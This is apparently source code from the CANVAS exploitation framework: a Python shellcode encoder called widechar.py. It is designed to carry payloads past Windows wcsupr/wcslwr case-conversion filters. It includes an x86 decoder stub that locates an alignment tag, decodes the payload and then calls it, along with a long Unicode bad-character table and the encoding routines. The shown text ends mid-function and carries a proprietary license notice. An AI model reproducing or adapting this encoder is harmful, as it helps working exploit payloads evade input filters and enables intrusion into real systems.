#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
Immunity, Inc. 2006
widechar.py

An encoder to bypass wcsupr and wcslwr
These are double-byte filters, and also require alignment.
I.E we really do need to treat the string as an array of integers for this 
encoder.
"""

import random
import sys
sys.path.append("..")
sys.path.append(".")

from MOSDEF import mosdef
from exploitutils import *


"""
This decoder has to go search for a tag first, to correct any possible
alignment issues.
Then it just does chunking as normal.
"""
widechar_intelchunkeddecoder = """
decoder:
        jmp getcodestart
gotcodestart:
        popl %esi
findtag:
        cmpw $0x3a3a,(%esi)
        je foundtag
        incl %esi
        jmp findtag
foundtag:
        incl %esi
        incl %esi //skip tag
        lodsl
.byte 0x93 //xchg %eax,%ebx
        lodsl
        leal (%eax,%ebx),%ebx
        lodsl
        leal (%eax,%ebx),%ecx
        pushl %esi
        popl %edx
label1: //decode the chunk header
        addl %ebx,(%esi)
        lodsl
        loop label1
        pushl %esi
label3:
        movl (%edx),%ecx
        test %ecx,%ecx
        je decoded
        nop
        movl 0x4(%edx),%ebx
label2:
        add %ebx,(%esi)
        lodsl
        loop label2
        add $0x8,%edx
        jmp label3
decoded:
        popl %eax
        call *%eax
getcodestart:
        cld
        call gotcodestart
"""
#set the seed to something static for debugging
random.seed(10)

#long list of upper, lower
widemap=[  0x0041, 0x0061, 
           0x0042, 0x0062, 
           0x0043, 0x0063, 
           0x0044, 0x0064, 
           0x0045, 0x0065, 
           0x0046, 0x0066, 
           0x0047, 0x0067, 
           0x0048, 0x0068, 
           0x0049, 0x0069, 
           0x004A, 0x006A, 
           0x004B, 0x006B, 
           0x004C, 0x006C, 
           0x004D, 0x006D, 
           0x004E, 0x006E, 
           0x004F, 0x006F, 
           0x0050, 0x0070, 
           0x0051, 0x0071, 
           0x0052, 0x0072, 
           0x0053, 0x0073, 
           0x0054, 0x0074, 
           0x0055, 0x0075, 
           0x0056, 0x0076, 
           0x0057, 0x0077, 
           0x0058, 0x0078, 
           0x0059, 0x0079, 
           0x005A, 0x007A, 
           0x00B5, 0x03BC, 
           0x00C0, 0x00E0, 
           0x00C1, 0x00E1, 
           0x00C2, 0x00E2, 
           0x00C3, 0x00E3, 
           0x00C4, 0x00E4, 
           0x00C5, 0x00E5, 
           0x00C6, 0x00E6, 
           0x00C7, 0x00E7, 
           0x00C8, 0x00E8, 
           0x00C9, 0x00E9, 
           0x00CA, 0x00EA, 
           0x00CB, 0x00EB, 
           0x00CC, 0x00EC, 
           0x00CD, 0x00ED, 
           0x00CE, 0x00EE, 
           0x00CF, 0x00EF, 
           0x00D0, 0x00F0, 
           0x00D1, 0x00F1, 
           0x00D2, 0x00F2, 
           0x00D3, 0x00F3, 
           0x00D4, 0x00F4, 
           0x00D5, 0x00F5, 
           0x00D6, 0x00F6, 
           0x00D8, 0x00F8, 
           0x00D9, 0x00F9, 
           0x00DA, 0x00FA, 
           0x00DB, 0x00FB, 
           0x00DC, 0x00FC, 
           0x00DD, 0x00FD, 
           0x00DE, 0x00FE, 
           0x00DF, 0x0073 , 
           0x0100, 0x0101, 
           0x0102, 0x0103, 
           0x0104, 0x0105, 
           0x0106, 0x0107, 
           0x0108, 0x0109, 
           0x010A, 0x010B, 
           0x010C, 0x010D, 
           0x010E, 0x010F, 
           0x0110, 0x0111, 
           0x0112, 0x0113, 
           0x0114, 0x0115, 
           0x0116, 0x0117, 
           0x0118, 0x0119, 
           0x011A, 0x011B, 
           0x011C, 0x011D, 
           0x011E, 0x011F,
           0x0120, 0x0121, 
           0x0122, 0x0123, 
           0x0124, 0x0125, 
           0x0126, 0x0127, 
           0x0128, 0x0129, 
           0x012A, 0x012B, 
           0x012C, 0x012D, 
           0x012E, 0x012F, 
           0x0130, 0x0069, 
           0x0132, 0x0133, 
           0x0134, 0x0135, 
           0x0136, 0x0137, 
           0x0139, 0x013A, 
           0x013B, 0x013C, 
           0x013D, 0x013E, 
           0x013F, 0x0140, 
           0x0141, 0x0142, 
           0x0143, 0x0144, 
           0x0145, 0x0146, 
           0x0147, 0x0148, 
           0x0149, 0x02BC , 
           0x014A, 0x014B, 
           0x014C, 0x014D, 
           0x014E, 0x014F, 
           0x0150, 0x0151, 
           0x0152, 0x0153, 
           0x0154, 0x0155, 
           0x0156, 0x0157, 
           0x0158, 0x0159, 
           0x015A, 0x015B, 
           0x015C, 0x015D, 
           0x015E, 0x015F, 
           0x0160, 0x0161, 
           0x0162, 0x0163, 
           0x0164, 0x0165, 
           0x0166, 0x0167, 
           0x0168, 0x0169, 
           0x016A, 0x016B, 
           0x016C, 0x016D, 
           0x016E, 0x016F, 
           0x0170, 0x0171, 
           0x0172, 0x0173, 
           0x0174, 0x0175, 
           0x0176, 0x0177, 
           0x0178, 0x00FF, 
           0x0179, 0x017A, 
           0x017B, 0x017C, 
           0x017D, 0x017E, 
           0x017F, 0x0073, 
           0x0181, 0x0253, 
           0x0182, 0x0183, 
           0x0184, 0x0185, 
           0x0186, 0x0254, 
           0x0187, 0x0188, 
           0x0189, 0x0256, 
           0x018A, 0x0257, 
           0x018B, 0x018C, 
           0x018E, 0x01DD, 
           0x018F, 0x0259, 
           0x0190, 0x025B, 
           0x0191, 0x0192, 
           0x0193, 0x0260, 
           0x0194, 0x0263, 
           0x0196, 0x0269, 
           0x0197, 0x0268, 
           0x0198, 0x0199, 
           0x019C, 0x026F, 
           0x019D, 0x0272, 
           0x019F, 0x0275, 
           0x01A0, 0x01A1, 
           0x01A2, 0x01A3, 
           0x01A4, 0x01A5, 
           0x01A6, 0x0280, 
           0x01A7, 0x01A8, 
           0x01A9, 0x0283, 
           0x01AC, 0x01AD, 
           0x01AE, 0x0288, 
           0x01AF, 0x01B0, 
           0x01B1, 0x028A, 
           0x01B2, 0x028B, 
           0x01B3, 0x01B4, 
           0x01B5, 0x01B6, 
           0x01B7, 0x0292, 
           0x01B8, 0x01B9, 
           0x01BC, 0x01BD, 
           0x01C4, 0x01C6, 
           0x01C5, 0x01C6, 
           0x01C7, 0x01C9, 
           0x01C8, 0x01C9, 
           0x01CA, 0x01CC, 
           0x01CB, 0x01CC, 
           0x01CD, 0x01CE, 
           0x01CF, 0x01D0, 
           0x01D1, 0x01D2, 
           0x01D3, 0x01D4, 
           0x01D5, 0x01D6, 
           0x01D7, 0x01D8, 
           0x01D9, 0x01DA, 
           0x01DB, 0x01DC, 
           0x01DE, 0x01DF, 
           0x01E0, 0x01E1, 
           0x01E2, 0x01E3, 
           0x01E4, 0x01E5, 
           0x01E6, 0x01E7, 
           0x01E8, 0x01E9, 
           0x01EA, 0x01EB, 
           0x01EC, 0x01ED, 
           0x01EE, 0x01EF, 
           0x01F0, 0x006A , 
           0x01F1, 0x01F3, 
           0x01F2, 0x01F3, 
           0x01F4, 0x01F5, 
           0x01F6, 0x0195, 
           0x01F7, 0x01BF, 
           0x01F8, 0x01F9, 
           0x01FA, 0x01FB, 
           0x01FC, 0x01FD, 
           0x01FE, 0x01FF, 
           0x0200, 0x0201, 
           0x0202, 0x0203, 
           0x0204, 0x0205, 
           0x0206, 0x0207, 
           0x0208, 0x0209, 
           0x020A, 0x020B, 
           0x020C, 0x020D, 
           0x020E, 0x020F, 
           0x0210, 0x0211, 
           0x0212, 0x0213, 
           0x0214, 0x0215, 
           0x0216, 0x0217, 
           0x0218, 0x0219, 
           0x021A, 0x021B, 
           0x021C, 0x021D, 
           0x021E, 0x021F, 
           0x0220, 0x019E, 
           0x0222, 0x0223, 
           0x0224, 0x0225, 
           0x0226, 0x0227, 
           0x0228, 0x0229, 
           0x022A, 0x022B, 
           0x022C, 0x022D, 
           0x022E, 0x022F, 
           0x0230, 0x0231, 
           0x0232, 0x0233, 
           0x0345, 0x03B9, 
           0x0386, 0x03AC, 
           0x0388, 0x03AD, 
           0x0389, 0x03AE, 
           0x038A, 0x03AF, 
           0x038C, 0x03CC, 
           0x038E, 0x03CD, 
           0x038F, 0x03CE, 
           0x0390, 0x03B9 , 
           0x0391, 0x03B1, 
           0x0392, 0x03B2, 
           0x0393, 0x03B3, 
           0x0394, 0x03B4, 
           0x0395, 0x03B5, 
           0x0396, 0x03B6, 
           0x0397, 0x03B7, 
           0x0398, 0x03B8, 
           0x0399, 0x03B9, 
           0x039A, 0x03BA, 
           0x039B, 0x03BB, 
           0x039C, 0x03BC, 
           0x039D, 0x03BD, 
           0x039E, 0x03BE, 
           0x039F, 0x03BF, 
           0x03A0, 0x03C0, 
           0x03A1, 0x03C1, 
           0x03A3, 0x03C3, 
           0x03A4, 0x03C4, 
           0x03A5, 0x03C5, 
           0x03A6, 0x03C6, 
           0x03A7, 0x03C7, 
           0x03A8, 0x03C8, 
           0x03A9, 0x03C9, 
           0x03AA, 0x03CA, 
           0x03AB, 0x03CB, 
           0x03B0, 0x03C5 , 
           0x03C2, 0x03C3, 
           0x03D0, 0x03B2, 
           0x03D1, 0x03B8, 
           0x03D5, 0x03C6, 
           0x03D6, 0x03C0, 
           0x03D8, 0x03D9, 
           0x03DA, 0x03DB, 
           0x03DC, 0x03DD, 
           0x03DE, 0x03DF, 
           0x03E0, 0x03E1, 
           0x03E2, 0x03E3, 
           0x03E4, 0x03E5, 
           0x03E6, 0x03E7, 
           0x03E8, 0x03E9, 
           0x03EA, 0x03EB, 
           0x03EC, 0x03ED, 
           0x03EE, 0x03EF, 
           0x03F0, 0x03BA, 
           0x03F1, 0x03C1, 
           0x03F4, 0x03B8, 
           0x03F5, 0x03B5, 
           0x03F7, 0x03F8, 
           0x03F9, 0x03F2, 
           0x03FA, 0x03FB, 
           0x0400, 0x0450, 
           0x0401, 0x0451, 
           0x0402, 0x0452, 
           0x0403, 0x0453, 
           0x0404, 0x0454, 
           0x0405, 0x0455, 
           0x0406, 0x0456, 
           0x0407, 0x0457, 
           0x0408, 0x0458, 
           0x0409, 0x0459, 
           0x040A, 0x045A, 
           0x040B, 0x045B, 
           0x040C, 0x045C, 
           0x040D, 0x045D, 
           0x040E, 0x045E, 
           0x040F, 0x045F, 
           0x0410, 0x0430, 
           0x0411, 0x0431, 
           0x0412, 0x0432, 
           0x0413, 0x0433, 
           0x0414, 0x0434, 
           0x0415, 0x0435, 
           0x0416, 0x0436, 
           0x0417, 0x0437, 
           0x0418, 0x0438, 
           0x0419, 0x0439, 
           0x041A, 0x043A, 
           0x041B, 0x043B, 
           0x041C, 0x043C, 
           0x041D, 0x043D, 
           0x041E, 0x043E, 
           0x041F, 0x043F, 
           0x0420, 0x0440, 
           0x0421, 0x0441, 
           0x0422, 0x0442, 
           0x0423, 0x0443, 
           0x0424, 0x0444, 
           0x0425, 0x0445, 
           0x0426, 0x0446, 
           0x0427, 0x0447, 
           0x0428, 0x0448, 
           0x0429, 0x0449, 
           0x042A, 0x044A, 
           0x042B, 0x044B, 
           0x042C, 0x044C, 
           0x042D, 0x044D, 
           0x042E, 0x044E, 
           0x042F, 0x044F, 
           0x0460, 0x0461, 
           0x0462, 0x0463, 
           0x0464, 0x0465, 
           0x0466, 0x0467, 
           0x0468, 0x0469, 
           0x046A, 0x046B, 
           0x046C, 0x046D, 
           0x046E, 0x046F, 
           0x0470, 0x0471, 
           0x0472, 0x0473, 
           0x0474, 0x0475, 
           0x0476, 0x0477, 
           0x0478, 0x0479, 
           0x047A, 0x047B, 
           0x047C, 0x047D, 
           0x047E, 0x047F, 
           0x0480, 0x0481, 
           0x048A, 0x048B, 
           0x048C, 0x048D, 
           0x048E, 0x048F, 
           0x0490, 0x0491, 
           0x0492, 0x0493, 
           0x0494, 0x0495, 
           0x0496, 0x0497, 
           0x0498, 0x0499, 
           0x049A, 0x049B, 
           0x049C, 0x049D, 
           0x049E, 0x049F, 
           0x04A0, 0x04A1, 
           0x04A2, 0x04A3, 
           0x04A4, 0x04A5, 
           0x04A6, 0x04A7, 
           0x04A8, 0x04A9, 
           0x04AA, 0x04AB, 
           0x04AC, 0x04AD, 
           0x04AE, 0x04AF, 
           0x04B0, 0x04B1, 
           0x04B2, 0x04B3, 
           0x04B4, 0x04B5, 
           0x04B6, 0x04B7, 
           0x04B8, 0x04B9, 
           0x04BA, 0x04BB, 
           0x04BC, 0x04BD, 
           0x04BE, 0x04BF, 
           0x04C1, 0x04C2, 
           0x04C3, 0x04C4, 
           0x04C5, 0x04C6, 
           0x04C7, 0x04C8, 
           0x04C9, 0x04CA, 
           0x04CB, 0x04CC, 
           0x04CD, 0x04CE, 
           0x04D0, 0x04D1, 
           0x04D2, 0x04D3, 
           0x04D4, 0x04D5, 
           0x04D6, 0x04D7, 
           0x04D8, 0x04D9, 
           0x04DA, 0x04DB, 
           0x04DC, 0x04DD, 
           0x04DE, 0x04DF, 
           0x04E0, 0x04E1, 
           0x04E2, 0x04E3, 
           0x04E4, 0x04E5, 
           0x04E6, 0x04E7, 
           0x04E8, 0x04E9, 
           0x04EA, 0x04EB, 
           0x04EC, 0x04ED, 
           0x04EE, 0x04EF, 
           0x04F0, 0x04F1, 
           0x04F2, 0x04F3, 
           0x04F4, 0x04F5, 
           0x04F8, 0x04F9, 
           0x0500, 0x0501, 
           0x0502, 0x0503, 
           0x0504, 0x0505, 
           0x0506, 0x0507, 
           0x0508, 0x0509, 
           0x050A, 0x050B, 
           0x050C, 0x050D, 
           0x050E, 0x050F, 
           0x0531, 0x0561, 
           0x0532, 0x0562, 
           0x0533, 0x0563, 
           0x0534, 0x0564, 
           0x0535, 0x0565, 
           0x0536, 0x0566, 
           0x0537, 0x0567, 
           0x0538, 0x0568, 
           0x0539, 0x0569, 
           0x053A, 0x056A, 
           0x053B, 0x056B, 
           0x053C, 0x056C, 
           0x053D, 0x056D, 
           0x053E, 0x056E, 
           0x053F, 0x056F, 
           0x0540, 0x0570, 
           0x0541, 0x0571, 
           0x0542, 0x0572, 
           0x0543, 0x0573, 
           0x0544, 0x0574, 
           0x0545, 0x0575, 
           0x0546, 0x0576, 
           0x0547, 0x0577, 
           0x0548, 0x0578, 
           0x0549, 0x0579, 
           0x054A, 0x057A, 
           0x054B, 0x057B, 
           0x054C, 0x057C, 
           0x054D, 0x057D, 
           0x054E, 0x057E, 
           0x054F, 0x057F, 
           0x0550, 0x0580, 
           0x0551, 0x0581, 
           0x0552, 0x0582, 
           0x0553, 0x0583, 
           0x0554, 0x0584, 
           0x0555, 0x0585, 
           0x0556, 0x0586, 
           0x0587, 0x0565 , 
           0x1E00, 0x1E01, 
           0x1E02, 0x1E03, 
           0x1E04, 0x1E05, 
           0x1E06, 0x1E07, 
           0x1E08, 0x1E09, 
           0x1E0A, 0x1E0B, 
           0x1E0C, 0x1E0D, 
           0x1E0E, 0x1E0F, 
           0x1E10, 0x1E11, 
           0x1E12, 0x1E13, 
           0x1E14, 0x1E15, 
           0x1E16, 0x1E17, 
           0x1E18, 0x1E19, 
           0x1E1A, 0x1E1B, 
           0x1E1C, 0x1E1D, 
           0x1E1E, 0x1E1F, 
           0x1E20, 0x1E21, 
           0x1E22, 0x1E23, 
           0x1E24, 0x1E25, 
           0x1E26, 0x1E27, 
           0x1E28, 0x1E29, 
           0x1E2A, 0x1E2B, 
           0x1E2C, 0x1E2D, 
           0x1E2E, 0x1E2F, 
           0x1E30, 0x1E31, 
           0x1E32, 0x1E33, 
           0x1E34, 0x1E35, 
           0x1E36, 0x1E37, 
           0x1E38, 0x1E39, 
           0x1E3A, 0x1E3B, 
           0x1E3C, 0x1E3D, 
           0x1E3E, 0x1E3F, 
           0x1E40, 0x1E41, 
           0x1E42, 0x1E43, 
           0x1E44, 0x1E45, 
           0x1E46, 0x1E47, 
           0x1E48, 0x1E49, 
           0x1E4A, 0x1E4B, 
           0x1E4C, 0x1E4D, 
           0x1E4E, 0x1E4F, 
           0x1E50, 0x1E51, 
           0x1E52, 0x1E53, 
           0x1E54, 0x1E55, 
           0x1E56, 0x1E57, 
           0x1E58, 0x1E59, 
           0x1E5A, 0x1E5B, 
           0x1E5C, 0x1E5D, 
           0x1E5E, 0x1E5F, 
           0x1E60, 0x1E61, 
           0x1E62, 0x1E63, 
           0x1E64, 0x1E65, 
           0x1E66, 0x1E67, 
           0x1E68, 0x1E69, 
           0x1E6A, 0x1E6B, 
           0x1E6C, 0x1E6D, 
           0x1E6E, 0x1E6F, 
           0x1E70, 0x1E71, 
           0x1E72, 0x1E73, 
           0x1E74, 0x1E75, 
           0x1E76, 0x1E77, 
           0x1E78, 0x1E79, 
           0x1E7A, 0x1E7B, 
           0x1E7C, 0x1E7D, 
           0x1E7E, 0x1E7F, 
           0x1E80, 0x1E81, 
           0x1E82, 0x1E83, 
           0x1E84, 0x1E85, 
           0x1E86, 0x1E87, 
           0x1E88, 0x1E89, 
           0x1E8A, 0x1E8B, 
           0x1E8C, 0x1E8D, 
           0x1E8E, 0x1E8F, 
           0x1E90, 0x1E91, 
           0x1E92, 0x1E93, 
           0x1E94, 0x1E95, 
           0x1E96, 0x0068 , 
           0x1E97, 0x0074 , 
           0x1E98, 0x0077 , 
           0x1E99, 0x0079 , 
           0x1E9A, 0x0061 , 
           0x1E9B, 0x1E61, 
           0x1EA0, 0x1EA1, 
           0x1EA2, 0x1EA3, 
           0x1EA4, 0x1EA5, 
           0x1EA6, 0x1EA7, 
           0x1EA8, 0x1EA9, 
           0x1EAA, 0x1EAB, 
           0x1EAC, 0x1EAD, 
           0x1EAE, 0x1EAF, 
           0x1EB0, 0x1EB1, 
           0x1EB2, 0x1EB3, 
           0x1EB4, 0x1EB5, 
           0x1EB6, 0x1EB7, 
           0x1EB8, 0x1EB9, 
           0x1EBA, 0x1EBB, 
           0x1EBC, 0x1EBD, 
           0x1EBE, 0x1EBF, 
           0x1EC0, 0x1EC1, 
           0x1EC2, 0x1EC3, 
           0x1EC4, 0x1EC5, 
           0x1EC6, 0x1EC7, 
           0x1EC8, 0x1EC9, 
           0x1ECA, 0x1ECB, 
           0x1ECC, 0x1ECD, 
           0x1ECE, 0x1ECF, 
           0x1ED0, 0x1ED1, 
           0x1ED2, 0x1ED3, 
           0x1ED4, 0x1ED5, 
           0x1ED6, 0x1ED7, 
           0x1ED8, 0x1ED9, 
           0x1EDA, 0x1EDB, 
           0x1EDC, 0x1EDD, 
           0x1EDE, 0x1EDF, 
           0x1EE0, 0x1EE1, 
           0x1EE2, 0x1EE3, 
           0x1EE4, 0x1EE5, 
           0x1EE6, 0x1EE7, 
           0x1EE8, 0x1EE9, 
           0x1EEA, 0x1EEB, 
           0x1EEC, 0x1EED, 
           0x1EEE, 0x1EEF, 
           0x1EF0, 0x1EF1, 
           0x1EF2, 0x1EF3, 
           0x1EF4, 0x1EF5, 
           0x1EF6, 0x1EF7, 
           0x1EF8, 0x1EF9, 
           0x1F08, 0x1F00, 
           0x1F09, 0x1F01, 
           0x1F0A, 0x1F02, 
           0x1F0B, 0x1F03, 
           0x1F0C, 0x1F04, 
           0x1F0D, 0x1F05, 
           0x1F0E, 0x1F06, 
           0x1F0F, 0x1F07, 
           0x1F18, 0x1F10, 
           0x1F19, 0x1F11, 
           0x1F1A, 0x1F12, 
           0x1F1B, 0x1F13, 
           0x1F1C, 0x1F14, 
           0x1F1D, 0x1F15, 
           0x1F28, 0x1F20, 
           0x1F29, 0x1F21, 
           0x1F2A, 0x1F22, 
           0x1F2B, 0x1F23, 
           0x1F2C, 0x1F24, 
           0x1F2D, 0x1F25, 
           0x1F2E, 0x1F26, 
           0x1F2F, 0x1F27, 
           0x1F38, 0x1F30, 
           0x1F39, 0x1F31, 
           0x1F3A, 0x1F32, 
           0x1F3B, 0x1F33, 
           0x1F3C, 0x1F34, 
           0x1F3D, 0x1F35, 
           0x1F3E, 0x1F36, 
           0x1F3F, 0x1F37, 
           0x1F48, 0x1F40, 
           0x1F49, 0x1F41, 
           0x1F4A, 0x1F42, 
           0x1F4B, 0x1F43, 
           0x1F4C, 0x1F44, 
           0x1F4D, 0x1F45, 
           0x1F50, 0x03C5 , 
           0x1F52, 0x03C5 , 
           0x1F54, 0x03C5 , 
           0x1F56, 0x03C5 , 
           0x1F59, 0x1F51, 
           0x1F5B, 0x1F53, 
           0x1F5D, 0x1F55, 
           0x1F5F, 0x1F57, 
           0x1F68, 0x1F60, 
           0x1F69, 0x1F61, 
           0x1F6A, 0x1F62, 
           0x1F6B, 0x1F63, 
           0x1F6C, 0x1F64, 
           0x1F6D, 0x1F65, 
           0x1F6E, 0x1F66, 
           0x1F6F, 0x1F67, 
           0x1F80, 0x1F00 , 
           0x1F81, 0x1F01 , 
           0x1F82, 0x1F02 , 
           0x1F83, 0x1F03 , 
           0x1F84, 0x1F04 , 
           0x1F85, 0x1F05 , 
           0x1F86, 0x1F06 , 
           0x1F87, 0x1F07 , 
           0x1F88, 0x1F80, 
           0x1F89, 0x1F81, 
           0x1F8A, 0x1F82, 
           0x1F8B, 0x1F83, 
           0x1F8C, 0x1F84, 
           0x1F8D, 0x1F85, 
           0x1F8E, 0x1F86, 
           0x1F8F, 0x1F87, 
           0x1F90, 0x1F20 , 
           0x1F91, 0x1F21 , 
           0x1F92, 0x1F22 , 
           0x1F93, 0x1F23 , 
           0x1F94, 0x1F24 , 
           0x1F95, 0x1F25 , 
           0x1F96, 0x1F26 , 
           0x1F97, 0x1F27 , 
           0x1F98, 0x1F90, 
           0x1F99, 0x1F91, 
           0x1F9A, 0x1F92, 
           0x1F9B, 0x1F93, 
           0x1F9C, 0x1F94, 
           0x1F9D, 0x1F95, 
           0x1F9E, 0x1F96, 
           0x1F9F, 0x1F97, 
           0x1FA0, 0x1F60 , 
           0x1FA1, 0x1F61 , 
           0x1FA2, 0x1F62 , 
           0x1FA3, 0x1F63 , 
           0x1FA4, 0x1F64 , 
           0x1FA5, 0x1F65 , 
           0x1FA6, 0x1F66 , 
           0x1FA7, 0x1F67 , 
           0x1FA8, 0x1FA0, 
           0x1FA9, 0x1FA1, 
           0x1FAA, 0x1FA2, 
           0x1FAB, 0x1FA3, 
           0x1FAC, 0x1FA4, 
           0x1FAD, 0x1FA5, 
           0x1FAE, 0x1FA6, 
           0x1FAF, 0x1FA7, 
           0x1FB2, 0x1F70 , 
           0x1FB3, 0x03B1 , 
           0x1FB4, 0x03AC , 
           0x1FB6, 0x03B1 , 
           0x1FB7, 0x03B1 , 
           0x1FB8, 0x1FB0, 
           0x1FB9, 0x1FB1, 
           0x1FBA, 0x1F70, 
           0x1FBB, 0x1F71, 
           0x1FBC, 0x1FB3, 
           0x1FBE, 0x03B9, 
           0x1FC2, 0x1F74 , 
           0x1FC3, 0x03B7 , 
           0x1FC4, 0x03AE , 
           0x1FC6, 0x03B7 , 
           0x1FC7, 0x03B7 , 
           0x1FC8, 0x1F72, 
           0x1FC9, 0x1F73, 
           0x1FCA, 0x1F74, 
           0x1FCB, 0x1F75, 
           0x1FCC, 0x1FC3, 
           0x1FD2, 0x03B9 , 
           0x1FD3, 0x03B9 , 
           0x1FD6, 0x03B9 , 
           0x1FD7, 0x03B9 , 
           0x1FD8, 0x1FD0, 
           0x1FD9, 0x1FD1, 
           0x1FDA, 0x1F76, 
           0x1FDB, 0x1F77, 
           0x1FE2, 0x03C5 , 
           0x1FE3, 0x03C5 , 
           0x1FE4, 0x03C1 , 
           0x1FE6, 0x03C5 , 
           0x1FE7, 0x03C5 , 
           0x1FE8, 0x1FE0, 
           0x1FE9, 0x1FE1, 
           0x1FEA, 0x1F7A, 
           0x1FEB, 0x1F7B, 
           0x1FEC, 0x1FE5, 
           0x1FF2, 0x1F7C , 
           0x1FF3, 0x03C9 , 
           0x1FF4, 0x03CE , 
           0x1FF6, 0x03C9 , 
           0x1FF7, 0x03C9 , 
           0x1FF8, 0x1F78, 
           0x1FF9, 0x1F79, 
           0x1FFA, 0x1F7C, 
           0x1FFB, 0x1F7D, 
           0x1FFC, 0x1FF3, 
           0x2126, 0x03C9, 
           0x212A, 0x006B, 
           0x212B, 0x00E5, 
           0x2160, 0x2170, 
           0x2161, 0x2171, 
           0x2162, 0x2172, 
           0x2163, 0x2173, 
           0x2164, 0x2174, 
           0x2165, 0x2175, 
           0x2166, 0x2176, 
           0x2167, 0x2177, 
           0x2168, 0x2178, 
           0x2169, 0x2179, 
           0x216A, 0x217A, 
           0x216B, 0x217B, 
           0x216C, 0x217C, 
           0x216D, 0x217D, 
           0x216E, 0x217E, 
           0x216F, 0x217F, 
           0x24B6, 0x24D0, 
           0x24B7, 0x24D1, 
           0x24B8, 0x24D2, 
           0x24B9, 0x24D3, 
           0x24BA, 0x24D4, 
           0x24BB, 0x24D5, 
           0x24BC, 0x24D6, 
           0x24BD, 0x24D7, 
           0x24BE, 0x24D8, 
           0x24BF, 0x24D9, 
           0x24C0, 0x24DA, 
           0x24C1, 0x24DB, 
           0x24C2, 0x24DC, 
           0x24C3, 0x24DD, 
           0x24C4, 0x24DE, 
           0x24C5, 0x24DF, 
           0x24C6, 0x24E0, 
           0x24C7, 0x24E1, 
           0x24C8, 0x24E2, 
           0x24C9, 0x24E3, 
           0x24CA, 0x24E4, 
           0x24CB, 0x24E5, 
           0x24CC, 0x24E6, 
           0x24CD, 0x24E7, 
           0x24CE, 0x24E8, 
           0x24CF, 0x24E9, 
           0xFB00, 0x0066 , 
           0xFB01, 0x0066 , 
           0xFB02, 0x0066 , 
           0xFB03, 0x0066 , 
           0xFB04, 0x0066 , 
           0xFB05, 0x0073 , 
           0xFB06, 0x0073 , 
           0xFB13, 0x0574 , 
           0xFB14, 0x0574 , 
           0xFB15, 0x0574 , 
           0xFB16, 0x057E , 
           0xFB17, 0x0574 , 
           0xFF21, 0xFF41, 
           0xFF22, 0xFF42, 
           0xFF23, 0xFF43, 
           0xFF24, 0xFF44, 
           0xFF25, 0xFF45, 
           0xFF26, 0xFF46, 
           0xFF27, 0xFF47, 
           0xFF28, 0xFF48, 
           0xFF29, 0xFF49, 
           0xFF2A, 0xFF4A, 
           0xFF2B, 0xFF4B, 
           0xFF2C, 0xFF4C, 
           0xFF2D, 0xFF4D, 
           0xFF2E, 0xFF4E, 
           0xFF2F, 0xFF4F, 
           0xFF30, 0xFF50, 
           0xFF31, 0xFF51, 
           0xFF32, 0xFF52, 
           0xFF33, 0xFF53, 
           0xFF34, 0xFF54, 
           0xFF35, 0xFF55, 
           0xFF36, 0xFF56, 
           0xFF37, 0xFF57, 
           0xFF38, 0xFF58, 
           0xFF39, 0xFF59, 
           0xFF3A, 0xFF5A, 
           
           #dave's fun here for win2k
           0x551a, 0x551b,
           0x0000,0x0000
           ]

#note: MSVCRT's wcsupr is much more complex than ntdll's
#eventually it calls LCMapStringW

#intel order shorts stored as strings in these arrays
wcsupr_bad=[]
wcslwr_bad=[]
count=0
for i in range((len(widemap))/2):
    wcslwr_bad+=[halfword2istr(widemap[count])]
    wcsupr_bad+=[halfword2istr(widemap[count+1])]
    count += 2

#print "End: %s"%prettyhexprint((wcsupr_bad)[-1])

keys=[] # a list of preset "random" numbers to use that seem to work well
import struct

class widechar_chunkedaddencoder:
    def __init__(self):
        self.minimumchunklength=140
        self.setadd=uint32(0)
        self.badstring=[] #list of wide chars we can't use.
        self.decoder=widechar_intelchunkeddecoder
        return

    def run(self,filename):
        return self.encode(open(filename,"r").read())

    def getKey(self):
        return self.setadd

    def setbadstring(self,badstring):
        self.badstring=badstring
        return

    def has_bad_char(self,astring):
        i=self.find_bad_char(astring)
        if i==-1:
            return 0
        return 1

    def find_bad_char(self,astring):
        """
        we have to do it the slow way, sorry
        """
        #print "Badstring: %s"%self.badstring
        i=0
        while i<len(astring):
            tstr=astring[i:i+2]
            try:
                #print "Testing: %s"%prettyhexprint(tstr)
                index=self.badstring.index(tstr)
            except ValueError:
                index=-1
            if index!=-1:
                print "Failed on %s at %d"%(prettyhexprint(tstr),index)
                return i
            i+=2
        return -1

    def xordata(self,data,xor,debug=0):
        i=0
        newdata=""
        while i<len(data):
            word=struct.unpack("<L", data[i:i+4])
            word2=uint32(word[0]^xor)
            
            if debug:
                print "%8.8x->%8.8x"%(word, word2)
            newdata += struct.pack("<L", word2)
            i+=4
        return newdata
        
    def encodedata(self,data,debug=0):
        i=0
        newdata=""
        #print "Len data="+str(len(data))
        while i<len(data):
            #print "i=%d"%i 
            word=struct.unpack("<L", (data[i:i+4]))
            word2=csub(word[0],self.setadd)

            if debug:
                print "%8.8x->%8.8x"%(word,word2)
            newdata+=struct.pack("<L", word2)
            i+=4
        #print "Len newdata="+str(len(newdata))
        return newdata
            
    def encode(self,data):
        mod=4-len(data)%4
        if mod!=4:
            data=data+"\x00"*mod

        (split1,split2,newdata)=self.findadditives(data)
        if split1==None:
            print "Error: Did not find split for your shellcode!"
            return ""
        
        split1=struct.pack("<L", split1)
        split2=struct.pack("<L", split2)
        #print "Assembling decoder stub"
        decoderstub = ""
        line = 0
        decoderstub = mosdef.assemble(self.decoder, "X86")
        if self.has_bad_char(decoderstub):
            print "Bad char in decoder stub!"
            print "Decoder: \n%s"%prettyhexprint(decoderstub)
            i=self.find_bad_char(decoderstub)
            print "Index: %s"%i
            print "Stub Bad Char: %s"%prettyhexprint(decoderstub[i:i+2])
            raise Exception, "bad chars in decoder stub!"
        header=decoderstub
        tag="\x3a\x3a" #tag the decoder searches for to ensure alignment
        if len(header) % 2 == 1:
            header += 'A'
        #padlen=4-len(header)%4
        #if padlen==4:
        #    padlen=0
        #padding="\x41"*padlen
        #result=header+padding+tag+split1+split2+newdata
        result=header+tag+split1+split2+newdata
        return result


    def encodechunk(self,data):
        """
        returns the size and the integer we encoded with
        """
        i=uint32(0)
        j=uint32(0)
        #we'll look for 50000 words
        self.presets=keys[:]
        while j<500000:
            j+=1
            if len(self.presets)>0:
                guess=self.presets.pop()
            else:
                guess=random.randint(0,sys.maxint-1)

                
            if random.randint(0,2)==1:
